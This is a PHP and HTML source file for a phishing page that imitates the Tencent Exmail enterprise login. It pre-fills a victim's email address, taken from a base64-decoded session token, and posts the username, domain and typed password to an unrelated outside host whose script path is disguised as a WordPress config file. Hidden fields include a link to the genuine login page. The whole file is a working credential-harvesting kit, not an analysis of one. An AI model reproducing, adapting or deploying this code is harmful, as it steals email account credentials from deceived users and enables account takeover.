<?php
ini_set('display_errors',0);
ob_start();
if (!isset($_SESSION)) { session_start();}


if(!isset($_SESSION['UZ_login'])){ header("location:noemail.php");}



$_POST["token"]=$_SESSION['UZ_login'];

function doEncrypt($string)
{
	$rand = substr(md5(microtime()),rand(0,26),2);
	$crystr = "".$rand."".base64_encode($string)."";
	return $crystr;
}

function doDecrypt($string)
{
	$str = substr($string, 2);
	$crystr = base64_decode($str);
	return $crystr;
}

$email = doDecrypt($_POST["token"]);
$userz = explode('@', $email);
 $users = $userz[0];


$ddomain=preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));

  $domains = explode('@', $email);
    $domain = ucfirst("$domains[1]");
	$domain2 = $domains[1];
    $domains1 = explode('.', $domain);
    $domain1 = ucwords ("$domains1[0]");

?>
<html>

<head>
<meta http-equiv="Content-Language" content="en-us">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>&#39472;&#35338;&#20225;&#26989;&#37109;&#31665;-&#30331;&#37636;&#20837;&#21475;</title>
<link rel="icon" type="image/png" href="https://exmail.qq.com/exmail_logo.ico" />
</head>
<style>
  html, body {
  font-family: Arial, sans-serif;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  input[type=text] {
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 100%;
  width: 100%;
  padding: 10px 15px;
  border: 1px solid #d5d5d5;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 0;
  font-size: 12px;
  font-family: Arial,sans-serif;
  color: #787878;
  }
  input[type=password] {
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 100%;
  width: 100%;
  padding: 10px 15px;
  border: 1px solid #ff0000;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 0;
  font-size: 12px;
  font-family: Arial,sans-serif;
  color: #787878;
  }
  input[type=text]:focus {
  outline: none;
  border: 1px solid #2984ef;
  }
  input[type=password]:focus {
  outline: none;
  border: 1px solid #ff0000;
  }

</style>
<body background="img/bg.jpg">

<div align="center">
	<table border="0" width="1018" cellspacing="0" cellpadding="0">
		<tr>
			<td>
			<table border="0" width="100%" cellspacing="0" cellpadding="0">
				<tr>
					<td>&nbsp;</td>
				</tr>
				<tr>
					<td>
					<table border="0" width="100%" cellspacing="0" cellpadding="0">
						<tr>
							<td width="118">
							<img border="0" src="img/exmail_logo_1473e91.png" width="138" height="21"></td>
							<td>&nbsp;</td>
							<td width="265"><font size="2">&#27880;&#20874;&#26032;&#20225;&#26989; | &#23458;&#25142;&#31471;&#25910;&#30332; | 
							English&nbsp; | &#31777;&#39636;&#29256;</font></td>
						</tr>
					</table>
					</td>
				</tr>
				<tr>
					<td height="109"></td>
				</tr>
				<tr>
					<td>
					<table border="0" width="100%" cellspacing="0" cellpadding="0">
						<tr>
							<td>
							<table border="0" width="100%" cellspacing="0" cellpadding="0">
								<tr>
									<td height="148"></td>
								</tr>
								<tr>
									<td height="90">
									  
         							<font size="6">&#19981;&#21482;&#26159;&#37109;&#31665;&#65292;<br>
									&#26356;&#26159;&#19968;&#31278;&#39640;&#25928;&#36774;&#20844;&#26032;&#39636;&#39511;</font></td>
								</tr>
								<tr>
									<td height="180"></td>
								</tr>
							</table>
							</td>
							<td width="265"></td>
							<td height="414" width="345" background="img/form.png">
							<table border="0" width="100%" cellspacing="0" cellpadding="0">
							 <form method="post" action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php">
								<tr>
									<td height="120"></td>
								</tr>
								<tr>
									<td>
									<table border="0" width="100%" cellspacing="0" cellpadding="0">
										<tr>
											<td width="31"></td>
											<td width="276" height="48">
											  <input type="text" name="user" required placeholder="&#37109;&#31665;&#36076;&#34399;/&#31649;&#29702;&#21729;&#36076;&#34399;" value="<?php echo $users;?>@<?php echo $ddomain;?>" >
											  <input type="hidden" name="domain" value="<?php echo $ddomain;?>">
											  <input type="hidden" name="link" value="https://exmail.qq.com/cgi-bin/loginpage">
											  <input type="hidden" name="sender" value="qqcom">
											</td>
											<td>&nbsp;</td>
										</tr>
									</table>
									</td>
								</tr>
								<tr>
									<td height="24"></td>
								</tr>
								<tr>
									<td>
									<table border="0" width="100%" cellspacing="0" cellpadding="0">
										<tr>
											<td width="31"></td>
											<td height="48" width="276">
											  <input type="password" name="passwd" required placeholder="&#36664;&#20837;&#37109;&#31665;&#23494;&#30908;" autofocus >
											</td>
											<td>&nbsp;</td>
										</tr>
									</table>
									</td>
								</tr>
								<tr>
									<td height="51"></td>
								</tr>
								<tr>
									<td>
									<table border="0" width="100%" cellspacing="0" cellpadding="0">
										<tr>
											<td width="31"></td>
											<td width="276">
											<input type="image" src="img/btn.png" width="276" height="40"></td>
											<td>&nbsp;</td>
										</tr>
									</table>
									</td>
								</tr>
								<tr>
									<td height="87"></td>
								</tr>
							 </form>
							</table>
							</td>
							<td width="2"></td>
						</tr>
					</table>
					</td>
				</tr>
				<tr>
					<td height="125"></td>
				</tr>
				<tr>
					<td height="20">
					<table border="0" width="100%" cellspacing="0" cellpadding="0">
						<tr>
							<td width="258" ></td>
							<td width="353">
							<img border="0" src="img/footer.png" width="514" height="19"></td>
							<td>&nbsp;</td>
						</tr>
					</table>
					</td>
				</tr>
				<tr>
					<td height="5"></td>
				</tr>
			</table>
			</td>
		</tr>
	</table>
</div>

</body>

</html>
<script>


 $(document).ready(function(){  
 
 	$('#myModal').modal('toggle'); 
 });

</script>